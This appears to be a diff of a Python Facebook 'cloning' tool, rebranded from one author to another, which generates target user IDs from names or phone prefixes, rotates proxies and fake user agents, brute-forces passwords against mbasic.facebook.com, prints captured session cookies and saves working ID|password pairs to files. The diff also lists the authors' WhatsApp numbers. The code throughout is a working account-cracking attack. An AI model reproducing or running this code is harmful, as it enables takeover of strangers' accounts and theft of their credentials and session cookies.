@@ -1,7 +1,7 @@
-#YASIR_X_MARWAN 
+#SPY 
 #use with cradit🥰🥰🥰🥰
-#SAT AfriDi YMM Bs
-#Contract WhatsApp : +923189141630
+#SAT Shahin YT
+#Contract WhatsApp : 01615161056
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -62,7 +62,7 @@ try:
  open('.prox.txt','w').write(prox)
 except Exception as e:
  print('')
-prox=open('.prox.py','r').read().splitlines()
+prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
     a='Nokia'
     b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -72,21 +72,18 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
-logo = ("""\033[1;37m            
-██╗   ██╗ █████╗ ███████╗██╗██████╗ 
-╚██╗ ██╔╝██╔══██╗██╔════╝██║██╔══██╗
- ╚████╔╝ ███████║███████╗██║██████╔╝
-  ╚██╔╝  ██╔══██║╚════██║██║██╔══██╗
-   ██║   ██║  ██║███████║██║██║  ██║
-   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
-                                   
-                                    
+logo = ("""\033[1;37m
+             ███████ ██████  ██    ██
+             ██      ██   ██  ██  ██
+             ███████ ██████    ████
+                  ██ ██         ██
+             ███████ ██         ██
 
     ┌───────────────────────────────────────┐
-    │ [✓] AUTHOR   : YASIR_X_MARWAN            │
-    │ [✓] GITHUB   : MARWAN-TECH404-1x1                │
-    │ [✓] WHATSAPP : +923189141630         │
-    │ [✓] POWER BY : \033[1;32m YAsirOo_AfriDii\033[1;37m           │
+    │ [✓] AUTHOR   : SHAHIN ALAM            │
+    │ [✓] GITHUB   : SPY-1x1                │
+    │ [✓] WHATSAPP : +8801615161056         │
+    │ [✓] POWER BY : \033[1;32m PRO PRONOY \033[1;37m           │
     └───────────────────────────────────────┘""")
 
 class Main:
@@ -95,12 +92,12 @@ class Main:
         self.ok = []
         self.cp = []
         self.loop = 0
-        os.system("xdg-open https://youtube.com/channel/UCEvniQzw5VfxGdpTT4RUf3A")
+        os.system("clear")
         print(logo)
         print(" [1] Facebook CLONING (Email) ")
         print(" [2] Facebook CLONING (Name)")
         print(" [3] Facebook CLONING (BD number)")
-        print(" [4] aLL System Exit ")
+        print(" [4] Get this script open code ")
         print(" [0] Exit")
         Shahin =input(" [√] Choose : ")
         if Shahin in ["1", "01"]:
@@ -115,7 +112,7 @@ class Main:
             exit()
 def v1():
     user=[]
-    os.system('xdg-open https://wa.me/+923189141630?text=')
+    os.system('clear')
     print(logo)
     kode = input(' [💉]  target fast name : ')
     kodex = input(' [💉] target last name :  ')
@@ -144,7 +141,7 @@ def v1():
     print(50*'_')
 def v2():
     user=[]
-    os.system('xdg-open https://wa.me/+923189141630?text=')
+    os.system('clear')
     print(logo)
     kode = input(' [💉]  target fast name : ')
     kodex = input(' [💉] target last name :  ')
@@ -172,7 +169,7 @@ def v2():
     print(50*'_')
 def v3():
     user=[]
-    os.system('xdg-open https://wa.me/+923189141630?text=')
+    os.system('clear')
     print(logo)
     kode = input(' [💉] Enter sim code: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
@@ -208,7 +205,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mAfriDi YMM kNa 😂x1\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mSPY1x1\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -246,22 +243,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[AfriDi YMM kNa 😂-ok] {uid}|{ps}")
+                print(f"\033[38;5;46m[ok] {uid}|{ps}")
                 print(f" \n Cookie : {coki}")
-                open('/sdcard/AfriDi YMM kNa 😂/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SPY/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[AfriDi YMM kNa 😂-cp] {cid}|{ps}")
-                open('/sdcard/AfriDi YMM kNa 😂-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[cp] {cid}|{ps}")
+                open('/sdcard/SPY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[AfriDi YMM kNa 😂1x1] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[SPY1x1] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
